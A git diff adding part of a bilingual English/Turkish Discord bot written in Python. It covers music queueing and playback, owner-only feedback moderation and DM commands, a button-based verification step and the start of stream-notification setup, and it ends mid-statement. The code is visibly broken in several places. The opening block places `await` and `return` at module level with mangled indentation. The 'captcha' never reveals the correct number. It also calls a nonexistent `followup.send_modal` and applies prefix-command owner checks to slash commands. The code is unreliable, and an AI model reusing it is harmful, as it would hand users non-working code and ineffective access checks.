@@ -6389,4 +6389,2860 @@ async def play_tr(interaction: discord.Interaction, müzik_linki: str):
             
     except Exception as e:
         sent_message = await interaction.followup.send(f"❌ Müzik yüklenemedi: {str(e)}")
-        await sent_message.edit(view=TranslateView(f"Could not load
+      await sent_message.edit(view=TranslateView(f"Added to queue: {info['title']}"))
+
+except Exception as e:
+    sent_message = await interaction.followup.send(f"❌ Müzik yüklenemedi: {str(e)}")
+    await sent_message.edit(view=TranslateView(f"Could not load video information.", "videodaki bilgiler yüklenemedi."))
+    return
+
+# Check if user is in a voice channel
+if not interaction.user.voice:
+    if lang == "en":
+        await interaction.followup.send("You must be in a voice channel to use this command.", ephemeral=True)
+    else:
+        await interaction.followup.send("Bu komutu kullanmak için bir ses kanalında olmalısınız.", ephemeral=True)
+    return
+
+# Get voice channel
+voice_channel = interaction.user.voice.channel
+
+# Check bot permissions
+if not voice_channel.permissions_for(interaction.guild.me).connect:
+    if lang == "en":
+        await interaction.followup.send("I don't have permission to connect to your voice channel.", ephemeral=True)
+    else:
+        await interaction.followup.send("Ses kanalınıza bağlanma iznim yok.", ephemeral=True)
+    return
+
+if not voice_channel.permissions_for(interaction.guild.me).speak:
+    if lang == "en":
+        await interaction.followup.send("I don't have permission to speak in your voice channel.", ephemeral=True)
+    else:
+        await interaction.followup.send("Ses kanalınızda konuşma iznim yok.", ephemeral=True)
+    return
+
+    try:
+        # Connect to voice channel if not already connected
+        if not interaction.guild.voice_client:
+            voice_client = await voice_channel.connect()
+        else:
+            voice_client = interaction.guild.voice_client
+            if voice_client.channel.id != voice_channel.id:
+                await voice_client.move_to(voice_channel)
+        
+        # Add track to queue
+        track = {
+            'url': url,
+            'title': info['title'],
+            'duration': info['duration'],
+            'requester': interaction.user,
+            'thumbnail': info.get('thumbnail', ''),
+            'webpage_url': info.get('webpage_url', '')
+        }
+        
+        # Initialize queue if needed
+        if interaction.guild.id not in music_queues:
+            music_queues[interaction.guild.id] = []
+            now_playing[interaction.guild.id] = None
+            music_loop[interaction.guild.id] = False
+        
+        music_queues[interaction.guild.id].append(track)
+        
+        # If nothing is playing, start playback
+        if not voice_client.is_playing() and not voice_client.is_paused():
+            await play_next(interaction.guild, voice_client, lang)
+        else:
+            if lang == "en":
+                await interaction.followup.send(f"Added to queue: **{info['title']}**\nDuration: {format_duration(info['duration'])}", view=TranslateView(f"Added to queue: **{info['title']}**\nDuration: {format_duration(info['duration'])}", f"Sıraya eklendi: **{info['title']}**\nSüre: {format_duration(info['duration'])}"))
+            else:
+                await interaction.followup.send(f"Sıraya eklendi: **{info['title']}**\nSüre: {format_duration(info['duration'])}", view=TranslateView(f"Added to queue: **{info['title']}**\nDuration: {format_duration(info['duration'])}", f"Sıraya eklendi: **{info['title']}**\nSüre: {format_duration(info['duration'])}"))
+    
+    except Exception as e:
+        print(f"Music play error: {e}")
+        if lang == "en":
+            await interaction.followup.send(f"Error playing music: {str(e)}", ephemeral=True)
+        else:
+            await interaction.followup.send(f"Müzik çalma hatası: {str(e)}", ephemeral=True)
+
+async def play_next(guild, voice_client, lang="en"):
+    """Play next song in queue"""
+    if guild.id not in music_queues or not music_queues[guild.id]:
+        # Start idle timer
+        idle_timers[guild.id] = asyncio.create_task(idle_disconnect(guild, voice_client))
+        return
+    
+    # Cancel idle timer if exists
+    if guild.id in idle_timers:
+        idle_timers[guild.id].cancel()
+        del idle_timers[guild.id]
+    
+    track = music_queues[guild.id].pop(0)
+    now_playing[guild.id] = track
+    
+    try:
+        # Download and play audio
+        ydl_opts = {
+            'format': 'bestaudio/best',
+            'quiet': True,
+            'no_warnings': True,
+            'default_search': 'auto',
+        }
+        
+        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+            info = ydl.extract_info(track['url'], download=False)
+            url2 = info['url']
+        
+        # Get FFmpeg options based on OS
+        ffmpeg_options = {
+            'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5 -nostdin',
+            'options': '-vn -filter:a "volume=0.8"'
+        }
+        
+        # Use FFmpegPCMAudio with corrected options
+        source = discord.FFmpegPCMAudio(
+            url2,
+            before_options=ffmpeg_options['before_options'],
+            options=ffmpeg_options['options']
+        )
+        
+        # Play audio
+        voice_client.play(source, after=lambda e: asyncio.run_coroutine_threadsafe(
+            play_next(guild, voice_client, lang), 
+            bot.loop
+        ) if e is None else None)
+        
+        # Send now playing message
+        channel = guild.system_channel or next((ch for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages), None)
+        if channel:
+            embed = discord.Embed(
+                title="🎵 Now Playing" if lang == "en" else "🎵 Şimdi Çalıyor",
+                description=f"**{track['title']}**",
+                color=discord.Color.green()
+            )
+            embed.add_field(
+                name="Duration" if lang == "en" else "Süre",
+                value=format_duration(track['duration']),
+                inline=True
+            )
+            embed.add_field(
+                name="Requested by" if lang == "en" else "İsteyen",
+                value=track['requester'].mention,
+                inline=True
+            )
+            if track['thumbnail']:
+                embed.set_thumbnail(url=track['thumbnail'])
+            
+            view = NowPlayingView(guild.id, lang)
+            await channel.send(embed=embed, view=view)
+    
+    except Exception as e:
+        print(f"Play next error: {e}")
+        # Try next song
+        await play_next(guild, voice_client, lang)
+
+async def idle_disconnect(guild, voice_client):
+    """Disconnect bot after 5 minutes of idle"""
+    await asyncio.sleep(300)  # 5 minutes
+    
+    if voice_client.is_connected() and not voice_client.is_playing() and not voice_client.is_paused():
+        try:
+            await voice_client.disconnect()
+            # Clean up music data
+            if guild.id in music_queues:
+                del music_queues[guild.id]
+            if guild.id in now_playing:
+                del now_playing[guild.id]
+            if guild.id in music_loop:
+                del music_loop[guild.id]
+            
+            channel = guild.system_channel or next((ch for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages), None)
+            if channel:
+                await channel.send(view=TranslateView(
+                    "Disconnected due to inactivity.",
+                    "Hareketsizlik nedeniyle bağlantı kesildi."
+                ))
+        except:
+            pass
+
+def format_duration(seconds):
+    """Format seconds to MM:SS or HH:MM:SS"""
+    if seconds is None:
+        return "Live"
+    
+    hours = seconds // 3600
+    minutes = (seconds % 3600) // 60
+    seconds = seconds % 60
+    
+    if hours > 0:
+        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"
+    else:
+        return f"{minutes:02d}:{seconds:02d}"
+
+class NowPlayingView(discord.ui.View):
+    """View for music controls"""
+    def __init__(self, guild_id, lang="en"):
+        super().__init__(timeout=None)
+        self.guild_id = guild_id
+        self.lang = lang
+    
+    @discord.ui.button(label="⏸️ Pause", style=discord.ButtonStyle.secondary)
+    async def pause_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.guild.voice_client and interaction.guild.voice_client.is_playing():
+            interaction.guild.voice_client.pause()
+            if self.lang == "en":
+                await interaction.response.send_message("Music paused.", ephemeral=True)
+            else:
+                await interaction.response.send_message("Müzik duraklatıldı.", ephemeral=True)
+    
+    @discord.ui.button(label="▶️ Resume", style=discord.ButtonStyle.secondary)
+    async def resume_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.guild.voice_client and interaction.guild.voice_client.is_paused():
+            interaction.guild.voice_client.resume()
+            if self.lang == "en":
+                await interaction.response.send_message("Music resumed.", ephemeral=True)
+            else:
+                await interaction.response.send_message("Müzik devam ediyor.", ephemeral=True)
+    
+    @discord.ui.button(label="⏭️ Skip", style=discord.ButtonStyle.primary)
+    async def skip_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.guild.voice_client and (interaction.guild.voice_client.is_playing() or interaction.guild.voice_client.is_paused()):
+            interaction.guild.voice_client.stop()
+            if self.lang == "en":
+                await interaction.response.send_message("Skipped current song.", ephemeral=True)
+            else:
+                await interaction.response.send_message("Şarkı atlandı.", ephemeral=True)
+    
+    @discord.ui.button(label="🔁 Loop", style=discord.ButtonStyle.success)
+    async def loop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if self.guild_id not in music_loop:
+            music_loop[self.guild_id] = False
+        
+        music_loop[self.guild_id] = not music_loop[self.guild_id]
+        
+        if music_loop[self.guild_id]:
+            button.style = discord.ButtonStyle.danger
+            button.label = "🔁 Looping"
+            if self.lang == "en":
+                await interaction.response.send_message("Loop enabled.", ephemeral=True)
+            else:
+                await interaction.response.send_message("Döngü etkinleştirildi.", ephemeral=True)
+        else:
+            button.style = discord.ButtonStyle.success
+            button.label = "🔁 Loop"
+            if self.lang == "en":
+                await interaction.response.send_message("Loop disabled.", ephemeral=True)
+            else:
+                await interaction.response.send_message("Döngü devre dışı.", ephemeral=True)
+        
+        await interaction.message.edit(view=self)
+    
+    @discord.ui.button(label="⏹️ Stop", style=discord.ButtonStyle.danger)
+    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.guild.voice_client:
+            # Clear queue
+            if interaction.guild.id in music_queues:
+                music_queues[interaction.guild.id].clear()
+            
+            # Stop playback
+            interaction.guild.voice_client.stop()
+            
+            # Disconnect
+            await interaction.guild.voice_client.disconnect()
+            
+            # Clean up
+            if interaction.guild.id in music_queues:
+                del music_queues[interaction.guild.id]
+            if interaction.guild.id in now_playing:
+                del now_playing[interaction.guild.id]
+            if interaction.guild.id in music_loop:
+                del music_loop[interaction.guild.id]
+            
+            if self.lang == "en":
+                await interaction.response.send_message("Music stopped and disconnected.", ephemeral=True)
+            else:
+                await interaction.response.send_message("Müzik durduruldu ve bağlantı kesildi.", ephemeral=True)
+
+# Feedback System
+feedback_data = {}
+feedback_channel = None
+feedback_banned_users = set()
+
+class FeedbackModal(discord.ui.Modal, title="Feedback / Geri Bildirim"):
+    """Modal for sending feedback"""
+    def __init__(self, lang="en"):
+        super().__init__()
+        self.lang = lang
+        
+        self.feedback_input = discord.ui.TextInput(
+            label="Your feedback" if lang == "en" else "Geri bildiriminiz",
+            style=discord.TextStyle.paragraph,
+            placeholder="Type your feedback here..." if lang == "en" else "Geri bildiriminizi buraya yazın...",
+            required=True,
+            max_length=1000
+        )
+        self.add_item(self.feedback_input)
+    
+    async def on_submit(self, interaction: discord.Interaction):
+        global feedback_data
+        
+        # Check if user is banned
+        if interaction.user.id in feedback_banned_users:
+            if self.lang == "en":
+                await interaction.response.send_message("You are banned from sending feedback.", ephemeral=True)
+            else:
+                await interaction.response.send_message("Geri bildirim göndermeniz yasaklandı.", ephemeral=True)
+            return
+        
+        # Generate feedback ID
+        feedback_id = str(uuid.uuid4())[:8]
+        
+        # Store feedback
+        feedback_data[feedback_id] = {
+            'user_id': interaction.user.id,
+            'user_name': str(interaction.user),
+            'message': self.feedback_input.value,
+            'timestamp': datetime.now().isoformat(),
+            'read': False,
+            'response': None
+        }
+        
+        # Send to feedback channel or DM
+        embed = discord.Embed(
+            title="📩 New Feedback" if self.lang == "en" else "📩 Yeni Geri Bildirim",
+            color=discord.Color.blue()
+        )
+        embed.add_field(name="ID", value=feedback_id, inline=True)
+        embed.add_field(name="User", value=f"{interaction.user.mention} ({interaction.user.id})", inline=True)
+        embed.add_field(name="Message", value=self.feedback_input.value[:500] + ("..." if len(self.feedback_input.value) > 500 else ""), inline=False)
+        embed.set_footer(text=f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        
+        try:
+            if feedback_channel:
+                await feedback_channel.send(embed=embed)
+            else:
+                # Send to bot owner via DM
+                owner = await bot.fetch_user(owner_id)
+                await owner.send(embed=embed)
+            
+            if self.lang == "en":
+                await interaction.response.send_message(
+                    f"Thank you for your feedback! Your feedback ID: `{feedback_id}`",
+                    ephemeral=True
+                )
+            else:
+                await interaction.response.send_message(
+                    f"Geri bildiriminiz için teşekkürler! Geri bildirim ID'niz: `{feedback_id}`",
+                    ephemeral=True
+                )
+        except Exception as e:
+            print(f"Feedback error: {e}")
+            if self.lang == "en":
+                await interaction.response.send_message("Error sending feedback. Please try again later.", ephemeral=True)
+            else:
+                await interaction.response.send_message("Geri bildirim gönderilirken hata oluştu. Lütfen daha sonra tekrar deneyin.", ephemeral=True)
+
+@bot.tree.command(name="feedback", description="Send feedback to bot owner")
+async def feedback_command(interaction: discord.Interaction):
+    """Send feedback to bot owner"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    modal = FeedbackModal(lang="en")
+    await interaction.response.send_modal(modal)
+
+@bot.tree.command(name="geri-bildirim", description="Bot sahibine geri bildirim gönder")
+async def geri_bildirim_command(interaction: discord.Interaction):
+    """Bot sahibine geri bildirim gönder"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    modal = FeedbackModal(lang="tr")
+    await interaction.response.send_modal(modal)
+
+@bot.tree.command(name="feedback-ban", description="Ban user from sending feedback (Owner only)")
+@commands.is_owner()
+async def feedback_ban(interaction: discord.Interaction, user_id: str, time: str = None):
+    """Ban user from sending feedback"""
+    try:
+        user_id_int = int(user_id)
+        feedback_banned_users.add(user_id_int)
+        
+        # Parse time if provided
+        ban_duration = None
+        if time:
+            if time.endswith('d'):
+                ban_duration = int(time[:-1]) * 24 * 3600
+            elif time.endswith('h'):
+                ban_duration = int(time[:-1]) * 3600
+            elif time.endswith('m'):
+                ban_duration = int(time[:-1]) * 60
+        
+        await interaction.response.send_message(f"User {user_id} banned from feedback." + 
+                                               (f" Duration: {time}" if time else ""))
+        
+        # Schedule unban if duration provided
+        if ban_duration:
+            asyncio.create_task(unban_after_duration(user_id_int, ban_duration))
+    
+    except ValueError:
+        await interaction.response.send_message("Invalid user ID.", ephemeral=True)
+
+@bot.tree.command(name="geri-bildirim-engelle", description="Kullanıcının geri bildirim göndermesini engelle (Sadece Sahip)")
+@commands.is_owner()
+async def geri_bildirim_engelle(interaction: discord.Interaction, user_id: str, süre: str = None):
+    """Kullanıcının geri bildirim göndermesini engelle"""
+    try:
+        user_id_int = int(user_id)
+        feedback_banned_users.add(user_id_int)
+        
+        # Süreyi parse et
+        ban_süresi = None
+        if süre:
+            if süre.endswith('g'):
+                ban_süresi = int(süre[:-1]) * 24 * 3600
+            elif süre.endswith('s'):
+                ban_süresi = int(süre[:-1]) * 3600
+            elif süre.endswith('d'):
+                ban_süresi = int(süre[:-1]) * 60
+        
+        await interaction.response.send_message(f"Kullanıcı {user_id} geri bildirimden engellendi." + 
+                                               (f" Süre: {süre}" if süre else ""))
+        
+        # Süreli ban için zamanlayıcı
+        if ban_süresi:
+            asyncio.create_task(unban_after_duration(user_id_int, ban_süresi, lang="tr"))
+    
+    except ValueError:
+        await interaction.response.send_message("Geçersiz kullanıcı ID.", ephemeral=True)
+
+async def unban_after_duration(user_id: int, duration: int, lang="en"):
+    """Unban user after specified duration"""
+    await asyncio.sleep(duration)
+    feedback_banned_users.discard(user_id)
+    
+    # Notify owner
+    owner = await bot.fetch_user(owner_id)
+    if lang == "en":
+        await owner.send(f"User {user_id} has been unbanned from feedback.")
+    else:
+        await owner.send(f"Kullanıcı {user_id} geri bildirim yasağı kaldırıldı.")
+
+@bot.tree.command(name="feedback-read", description="Mark feedback as read and respond (Owner only)")
+@commands.is_owner()
+async def feedback_read(interaction: discord.Interaction, feedback_id: str, message: str):
+    """Mark feedback as read and respond to user"""
+    if feedback_id not in feedback_data:
+        await interaction.response.send_message("Feedback not found.", ephemeral=True)
+        return
+    
+    feedback = feedback_data[feedback_id]
+    
+    # Send response to user
+    try:
+        user = await bot.fetch_user(feedback['user_id'])
+        
+        embed = discord.Embed(
+            title="📬 Feedback Response",
+            color=discord.Color.green()
+        )
+        embed.add_field(name="Your Feedback", value=feedback['message'][:500], inline=False)
+        embed.add_field(name="Response", value=message, inline=False)
+        embed.set_footer(text=f"Feedback ID: {feedback_id}")
+        
+        await user.send(embed=embed)
+        
+        # Update feedback
+        feedback['read'] = True
+        feedback['response'] = message
+        feedback['response_time'] = datetime.now().isoformat()
+        
+        await interaction.response.send_message(f"Response sent to user {user.mention}.")
+    
+    except Exception as e:
+        await interaction.response.send_message(f"Error sending response: {str(e)}", ephemeral=True)
+
+@bot.tree.command(name="geri-bildirim-okundu", description="Geri bildirimi okundu olarak işaretle ve yanıtla (Sadece Sahip)")
+@commands.is_owner()
+async def geri_bildirim_okundu(interaction: discord.Interaction, geri_bildirim_id: str, mesaj: str):
+    """Geri bildirimi okundu olarak işaretle ve kullanıcıya yanıtla"""
+    if geri_bildirim_id not in feedback_data:
+        await interaction.response.send_message("Geri bildirim bulunamadı.", ephemeral=True)
+        return
+    
+    feedback = feedback_data[geri_bildirim_id]
+    
+    # Kullanıcıya yanıt gönder
+    try:
+        user = await bot.fetch_user(feedback['user_id'])
+        
+        embed = discord.Embed(
+            title="📬 Geri Bildirim Yanıtı",
+            color=discord.Color.green()
+        )
+        embed.add_field(name="Geri Bildiriminiz", value=feedback['message'][:500], inline=False)
+        embed.add_field(name="Yanıt", value=mesaj, inline=False)
+        embed.set_footer(text=f"Geri Bildirim ID: {geri_bildirim_id}")
+        
+        await user.send(embed=embed)
+        
+        # Geri bildirimi güncelle
+        feedback['read'] = True
+        feedback['response'] = mesaj
+        feedback['response_time'] = datetime.now().isoformat()
+        
+        await interaction.response.send_message(f"Yanıt kullanıcı {user.mention}'a gönderildi.")
+    
+    except Exception as e:
+        await interaction.response.send_message(f"Yanıt gönderilirken hata: {str(e)}", ephemeral=True)
+
+@bot.tree.command(name="write-dm", description="Send DM to user (Owner only)")
+@commands.is_owner()
+async def write_dm(interaction: discord.Interaction, user_id: str, message: str):
+    """Send direct message to user"""
+    try:
+        user = await bot.fetch_user(int(user_id))
+        
+        embed = discord.Embed(
+            title="Message from Bot Owner",
+            description=message,
+            color=discord.Color.blue()
+        )
+        embed.set_footer(text="security_file | Sampy Bot Owner")
+        
+        await user.send(embed=embed)
+        await interaction.response.send_message(f"Message sent to {user.mention}.", ephemeral=True)
+    
+    except Exception as e:
+        await interaction.response.send_message(f"Error sending message: {str(e)}", ephemeral=True)
+
+@bot.tree.command(name="dm-yaz", description="Kullanıcıya DM gönder (Sadece Sahip)")
+@commands.is_owner()
+async def dm_yaz(interaction: discord.Interaction, kullanıcı_id: str, mesaj: str):
+    """Kullanıcıya direkt mesaj gönder"""
+    try:
+        user = await bot.fetch_user(int(kullanıcı_id))
+        
+        embed = discord.Embed(
+            title="Bot Sahibinden Mesaj",
+            description=mesaj,
+            color=discord.Color.blue()
+        )
+        embed.set_footer(text="security_file | Sampy Bot Sahibi")
+        
+        await user.send(embed=embed)
+        await interaction.response.send_message(f"Mesaj {user.mention}'a gönderildi.", ephemeral=True)
+    
+    except Exception as e:
+        await interaction.response.send_message(f"Mesaj gönderilirken hata: {str(e)}", ephemeral=True)
+
+@bot.tree.command(name="reset-bot", description="Reset bot data and settings (Owner only)")
+@commands.is_owner()
+async def reset_bot(interaction: discord.Interaction):
+    """Reset bot data and settings"""
+    # Clear all data
+    global feedback_data, feedback_banned_users, music_queues, now_playing, music_loop, temp_rooms, verified_users
+    
+    feedback_data.clear()
+    feedback_banned_users.clear()
+    music_queues.clear()
+    now_playing.clear()
+    music_loop.clear()
+    temp_rooms.clear()
+    verified_users.clear()
+    
+    await interaction.response.send_message("Bot data and settings have been reset.", ephemeral=True)
+
+@bot.tree.command(name="ai-info", description="Get AI service information")
+async def ai_info_command(interaction: discord.Interaction):
+    """Get AI service information"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    embed = discord.Embed(
+        title="🤖 AI Service Information",
+        description="AI Service Alternative Link: https://gemini.google.com/gem/1tmZEbdA8ar9OGoUgDU5R71_5nw_LZv-t?usp=",
+        color=discord.Color.blue()
+    )
+    embed.set_footer(text="This message is only visible to you.")
+    
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="ai-bilgi", description="AI hizmeti bilgilerini al")
+async def ai_bilgi_command(interaction: discord.Interaction):
+    """AI hizmeti bilgilerini al"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    embed = discord.Embed(
+        title="🤖 AI Hizmeti Bilgileri",
+        description="AI Hizmeti İçin Alternatif Link: https://gemini.google.com/gem/1tmZEbdA8ar9OGoUgDU5R71_5nw_LZv-t?usp=",
+        color=discord.Color.blue()
+    )
+    embed.set_footer(text="Bu mesaj sadece siz görebilirsiniz.")
+    
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+# Verification System
+verified_role_name_en = "Verified"
+verified_role_name_tr = "Doğrulandı"
+verified_users = set()
+
+class VerificationView(discord.ui.View):
+    """View for verification captcha"""
+    def __init__(self, correct_number: int, lang: str = "en"):
+        super().__init__(timeout=120)
+        self.correct_number = correct_number
+        self.lang = lang
+    
+    @discord.ui.button(label="1", style=discord.ButtonStyle.primary)
+    async def button1(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self.check_verification(interaction, 1)
+    
+    @discord.ui.button(label="2", style=discord.ButtonStyle.primary)
+    async def button2(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self.check_verification(interaction, 2)
+    
+    @discord.ui.button(label="3", style=discord.ButtonStyle.primary)
+    async def button3(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self.check_verification(interaction, 3)
+    
+    @discord.ui.button(label="4", style=discord.ButtonStyle.primary)
+    async def button4(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self.check_verification(interaction, 4)
+    
+    @discord.ui.button(label="5", style=discord.ButtonStyle.primary)
+    async def button5(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self.check_verification(interaction, 5)
+    
+    async def check_verification(self, interaction: discord.Interaction, selected_number: int):
+        if selected_number == self.correct_number:
+            # Grant verification
+            await grant_verification(interaction, self.lang)
+        else:
+            if self.lang == "en":
+                await interaction.response.send_message("Wrong number! Please try again.", ephemeral=True)
+            else:
+                await interaction.response.send_message("Yanlış sayı! Lütfen tekrar deneyin.", ephemeral=True)
+
+async def grant_verification(interaction: discord.Interaction, lang: str):
+    """Grant verification to user"""
+    # Find or create verified role
+    verified_role = None
+    role_name = verified_role_name_en if lang == "en" else verified_role_name_tr
+    
+    for role in interaction.guild.roles:
+        if role.name == role_name:
+            verified_role = role
+            break
+    
+    if not verified_role:
+        try:
+            verified_role = await interaction.guild.create_role(
+                name=role_name,
+                color=discord.Color.green(),
+                permissions=discord.Permissions.none()
+            )
+        except:
+            if lang == "en":
+                await interaction.response.send_message("Error creating verified role. Please contact admin.", ephemeral=True)
+            else:
+                await interaction.response.send_message("Doğrulandı rolü oluşturulurken hata. Lütfen yöneticiyle iletişime geçin.", ephemeral=True)
+            return
+    
+    # Add role to user
+    try:
+        await interaction.user.add_roles(verified_role)
+        verified_users.add(interaction.user.id)
+        
+        if lang == "en":
+            await interaction.response.send_message(
+                f"✅ **Verification Successful!**\n"
+                f"You have been granted the **{verified_role.name}** role.\n"
+                f"You can now use all commands.",
+                ephemeral=True
+            )
+        else:
+            await interaction.response.send_message(
+                f"✅ **Doğrulama Başarılı!**\n"
+                f"**{verified_role.name}** rolü size verildi.\n"
+                f"Artık tüm komutları kullanabilirsiniz.",
+                ephemeral=True
+            )
+    except Exception as e:
+        print(f"Verification error: {e}")
+        if lang == "en":
+            await interaction.response.send_message("Error granting verification. Please contact admin.", ephemeral=True)
+        else:
+            await interaction.response.send_message("Doğrulama verilirken hata. Lütfen yöneticiyle iletişime geçin.", ephemeral=True)
+
+async def check_verification(interaction: discord.Interaction) -> bool:
+    """Check if user is verified"""
+    # Bot owner bypass
+    if interaction.user.id == owner_id:
+        return True
+    
+    # Check cache
+    if interaction.user.id in verified_users:
+        return True
+    
+    # Check if user has verified role
+    role_name_en = verified_role_name_en
+    role_name_tr = verified_role_name_tr
+    
+    for role in interaction.user.roles:
+        if role.name == role_name_en or role.name == role_name_tr:
+            verified_users.add(interaction.user.id)
+            return True
+    
+    # User not verified
+    lang = "en" if interaction.command.name in [cmd.name for cmd in bot.tree.get_commands() if cmd.name in ["verify", "doğrula"]] else "tr"
+    
+    if lang == "en":
+        await interaction.response.send_message(
+            "❌ **You need to verify first!**\n"
+            "Please use `/verify` to complete the verification process.",
+            ephemeral=True
+        )
+    else:
+        await interaction.response.send_message(
+            "❌ **Önce doğrulama yapmalısınız!**\n"
+            "Lütfen doğrulama işlemini tamamlamak için `/doğrula` komutunu kullanın.",
+            ephemeral=True
+        )
+    return False
+
+@bot.tree.command(name="verify", description="Complete verification to use bot commands")
+async def verify_command(interaction: discord.Interaction):
+    """Complete verification process"""
+    # Generate random number for captcha
+    correct_number = random.randint(1, 5)
+    
+    # Create verification message
+    embed = discord.Embed(
+        title="🔐 Verification Required",
+        description="Please click the correct number to verify you're human:",
+        color=discord.Color.blue()
+    )
+    embed.add_field(
+        name="Instructions",
+        value="Click the button with the correct number to complete verification.",
+        inline=False
+    )
+    
+    view = VerificationView(correct_number, lang="en")
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+
+@bot.tree.command(name="doğrula", description="Bot komutlarını kullanmak için doğrulama yap")
+async def doğrula_command(interaction: discord.Interaction):
+    """Doğrulama işlemini tamamla"""
+    # Rastgele sayı oluştur
+    correct_number = random.randint(1, 5)
+    
+    # Doğrulama mesajı oluştur
+    embed = discord.Embed(
+        title="🔐 Doğrulama Gerekli",
+        description="Lütfen insan olduğunuzu doğrulamak için doğru sayıya tıklayın:",
+        color=discord.Color.blue()
+    )
+    embed.add_field(
+        name="Talimatlar",
+        value="Doğrulamayı tamamlamak için doğru sayının olduğu butona tıklayın.",
+        inline=False
+    )
+    
+    view = VerificationView(correct_number, lang="tr")
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+
+# Stream Notification Systems
+twitch_notifications = {}
+kick_notifications = {}
+youtube_notifications = {}
+
+class NotificationSetupSelect(discord.ui.Select):
+    """Select menu for notification setup"""
+    def __init__(self, platform: str, lang: str = "en"):
+        self.platform = platform
+        self.lang = lang
+        
+        options = [
+            discord.SelectOption(label="Add Channel", value="add", description="Add notification channel"),
+            discord.SelectOption(label="Remove Channel", value="remove", description="Remove notification channel"),
+            discord.SelectOption(label="Reset All", value="reset", description="Reset all notifications")
+        ]
+        
+        if lang == "tr":
+            options = [
+                discord.SelectOption(label="Kanal Ekle", value="add", description="Bildirim kanalı ekle"),
+                discord.SelectOption(label="Kanal Kaldır", value="remove", description="Bildirim kanalı kaldır"),
+                discord.SelectOption(label="Hepsini Sıfırla", value="reset", description="Tüm bildirimleri sıfırla")
+            ]
+        
+        super().__init__(placeholder="Select action..." if lang == "en" else "İşlem seç...", options=options)
+    
+    async def callback(self, interaction: discord.Interaction):
+        await interaction.response.defer()
+        
+        if self.values[0] == "add":
+            # Show channel input modal
+            modal = NotificationChannelModal(self.platform, "add", self.lang)
+            await interaction.followup.send_modal(modal)
+        
+        elif self.values[0] == "remove":
+            modal = NotificationChannelModal(self.platform, "remove", self.lang)
+            await interaction.followup.send_modal(modal)
+        
+        elif self.values[0] == "reset":
+            await reset_notifications(interaction, self.platform, self.lang)
+
+class NotificationChannelModal(discord.ui.Modal):
+    """Modal for channel selection"""
+    def __init__(self, platform: str, action: str, lang: str = "en"):
+        self.platform = platform
+        self.action = action
+        self.lang = lang
+        
+        title_map = {
+            "en": {
+                "twitch": "Twitch Notification Setup",
+                "kick": "Kick Notification Setup",
+                "youtube": "YouTube Notification Setup"
+            },
+            "tr": {
+                "twitch": "Twitch Bildirim Kurulumu",
+                "kick": "Kick Bildirim Kurulumu",
+                "youtube": "YouTube Bildirim Kurulumu"
+            }
+        }
+        
+        super().__init__(title=title_map[lang][platform])
+        
+        if action == "add":
+            if platform == "twitch":
+                self.add_item(discord.ui.TextInput(
+                    label="Twitch Channel Name" if lang == "en" else "Twitch Kanal Adı",
+                    placeholder="Enter Twitch channel name..." if lang == "en" else "Twitch kanal adını girin...",
+                    required=True
+                ))
+            elif platform == "kick":
+                self.add_item(discord.ui.TextInput(
+                    label="Kick Username" if lang == "en" else "Kick Kullanıcı Adı",
+                    placeholder="Enter Kick username..." if lang == "en" else "Kick kullanıcı adını girin...",
+                    required=True
+                ))
+            elif platform == "youtube":
+                self.add_item(discord.ui.TextInput(
+                    label="YouTube Channel ID" if lang == "en" else "YouTube Kanal ID",
+                    placeholder="Enter YouTube channel ID..." if lang == "en" else "YouTube kanal ID'sini girin...",
+                    required=True
+                ))
+        
+        self.add_item(discord.ui.TextInput(
+            label="Discord Channel ID" if lang == "en" else "Discord Kanal ID",
+            placeholder="Enter Discord channel ID (optional)..." if lang == "en" else "Discord kanal ID'sini girin (opsiyonel)...",
+            required=False
+        ))
+    
+    async def on_submit(self, interaction: discord.Interaction):
+        platform_name = self.children[0].value.strip()
+        discord_channel_id = self.children[1].value.strip() if len(self.children) > 1 else None
+        
+        # Validate Discord channel
+        discord_channel = None
+        if discord_channel_id:
+            try:
+                discord_channel = interaction.guild.get_channel(int(discord_channel_id))
+                if not discord_channel:
+                    if self.lang == "en":
+                        await interaction.response.send_message("Invalid Discord channel ID.", ephemeral=True)
+                    else:
+                        await interaction.response.send_message("Geçersiz Discord kanal ID.", ephemeral=True)
+                    return
+            except ValueError:
+                if self.lang == "en":
+                    await interaction.response.send_message("Invalid Discord channel ID format.", ephemeral=True)
+                else:
+                    await interaction.response.send_message("Geçersiz Discord kanal ID formatı.", ephemeral=True)
+                return
+        else:
+            discord_channel = interaction.channel
+        
+        # Store notification settings
+        guild_id = interaction.guild.id
+        
+        if self.platform == "twitch":
+            if guild_id not in twitch_notifications:
+                twitch_notifications[guild_id] = {}
+            
+            if self.action == "add":
+                twitch_notifications[guild_id][platform_name.lower()] = {
+                    'channel_id': discord_channel.id,
+                    'last_check': None,
+                    'is_live': False
+                }
+                
+                if self.lang == "en":
+                    await interaction.response.send_message(
+                        f"✅ Twitch notifications for `{platform_name}` have been set up in {discord_channel.mention}.",
+                        ephemeral=True
+                    )
+                else:
+                    await interaction.response.send_message(
+                        f"✅ `{platform_name}` için Twitch bildirimleri {discord_channel.mention} kanalına ayarlandı.",
